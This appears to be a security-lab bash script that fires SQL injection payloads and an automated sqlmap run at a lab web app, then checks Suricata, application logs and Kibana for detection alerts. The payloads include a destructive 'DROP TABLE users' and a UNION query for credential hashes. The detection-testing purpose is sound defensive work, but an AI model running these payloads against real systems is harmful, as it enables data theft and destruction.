#!/bin/bash
# SOC-Lab Attack Script: S3 - SQL Injection
# Purpose: Demonstrate SQL injection detection

set -e

# Configuration
TARGET="${TARGET:-app}"
TARGET_IP="${TARGET_IP:-172.23.0.20}"
TARGET_PORT="${TARGET_PORT:-3000}"
OUTPUT_DIR="/results"

echo "============================================"
echo "SOC-Lab Scenario S3: SQL Injection"
echo "============================================"
echo ""
echo "Target: http://$TARGET:$TARGET_PORT/users"
echo "Time: $(date -Iseconds)"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/s3_sqli_$(date +%Y%m%d_%H%M%S).txt"

# Check if target is reachable
echo "Checking target connectivity..."
if ! curl -s --connect-timeout 5 "http://$TARGET:$TARGET_PORT/" > /dev/null 2>&1; then
    echo "ERROR: Target is not reachable at http://$TARGET:$TARGET_PORT"
    exit 1
fi
echo "Target is reachable."
echo ""

echo "============================================"
echo "Phase 1: Normal Request (Baseline)"
echo "============================================"
echo "GET /users?id=1"
curl -s "http://$TARGET:$TARGET_PORT/users?id=1" | jq . 2>/dev/null || echo "(no valid JSON response)"
echo ""

echo "============================================"
echo "Phase 2: Manual SQLi Attempts"
echo "============================================"

# Array of SQLi payloads
sqli_payloads=(
    "1 OR 1=1"
    "1' OR '1'='1"
    "1; DROP TABLE users;--"
    "1 UNION SELECT * FROM users--"
    "1' UNION SELECT id,username,email,credential_hash,role,created_at FROM users--"
    "-1 OR 1=1"
    "1'--"
)

for payload in "${sqli_payloads[@]}"; do
    encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
    echo ""
    echo "Payload: $payload"
    echo "Request: GET /users?id=$encoded_payload"
    
    if ! response=$(curl -s --max-time 5 -w "\nHTTP_CODE:%{http_code}" \
        "http://$TARGET:$TARGET_PORT/users?id=$encoded_payload"); then
        response=$'\nHTTP_CODE:000'
    fi
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    body=$(echo "$response" | grep -v "HTTP_CODE:")
    
    echo "Response: HTTP $http_code"
    echo "$body" | head -5
    
    sleep 0.5
done

echo ""
echo "============================================"
echo "Phase 3: sqlmap Automated Attack"
echo "============================================"

# Run sqlmap
echo "Running sqlmap (batch mode)..."
sqlmap_status=0
sqlmap -u "http://$TARGET:$TARGET_PORT/users?id=1" \
    --batch \
    --level=3 \
    --risk=2 \
    --technique=BEUSTQ \
    --output-dir="$OUTPUT_DIR/sqlmap" \
    > "$OUTPUT_FILE" 2>&1 || sqlmap_status=$?

# Not finding an injectable parameter is the expected result for the remediated
# API. Keep the exit status in the evidence file and verify telemetry separately.
echo "sqlmap exit status: $sqlmap_status" >> "$OUTPUT_FILE"

echo ""
echo "sqlmap output (last 30 lines):"
tail -30 "$OUTPUT_FILE"

echo ""
echo "============================================"
echo "Phase 4: Search Endpoint SQLi"
echo "============================================"

search_payloads=(
    "admin"
    "admin' OR '1'='1"
    "' OR ''='"
    "admin'--"
)

for payload in "${search_payloads[@]}"; do
    encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
    echo ""
    echo "Search Payload: $payload"
    echo "Request: GET /users/search?name=$encoded_payload"
    
    if ! response=$(curl -s --max-time 5 -w "\nHTTP_CODE:%{http_code}" \
        "http://$TARGET:$TARGET_PORT/users/search?name=$encoded_payload"); then
        response=$'\nHTTP_CODE:000'
    fi
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    echo "Response: HTTP $http_code"
    
    sleep 0.5
done

echo ""
echo "============================================"
echo "Attack Complete"
echo "============================================"
echo ""
echo "Check the following for detection:"
echo ""
echo "1. Suricata logs:"
echo "   docker exec soc-lab-suricata grep SQLI /var/log/suricata/fast.log"
echo ""
echo "2. Application error logs:"
echo "   docker exec soc-lab-app cat /var/log/app/error.log | tail -20"
echo ""
echo "3. Kibana:"
echo "   - Search: event.action:sqli_attempt"
echo "   - Search: rule.name:*SQLI*"
echo ""
echo "Verification still required:"
echo "  [ ] Suricata detects SQLI alerts"
echo "  [ ] Application logs SQLi attempts"
echo "  [ ] Events are indexed in Elasticsearch"
echo "Run on the host: scripts/scenario_e2e_check.sh S3"
